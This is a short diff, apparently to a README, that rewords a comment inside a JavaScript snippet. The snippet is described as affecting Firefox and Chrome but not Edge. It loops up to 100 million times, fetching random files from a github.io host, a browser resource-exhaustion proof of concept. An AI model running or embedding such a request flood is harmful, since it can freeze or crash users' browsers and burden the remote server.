@@ -23,7 +23,7 @@ Affects Firefox and Chrome, but not MS Edge
 var p = 0, f = 1, fch
 while(p < 1e8) {
    p++ // the process is not infinite
-   f = (Math.floor(Math.random()*98)+1) // variables are outside the stack
+   f = (Math.floor(Math.random()*98)+1) // all variables are outside of the stack
    fch = fetch(`https://vsnits.github.io/rps/files/${f}`) // all files are empty
    }
 ```
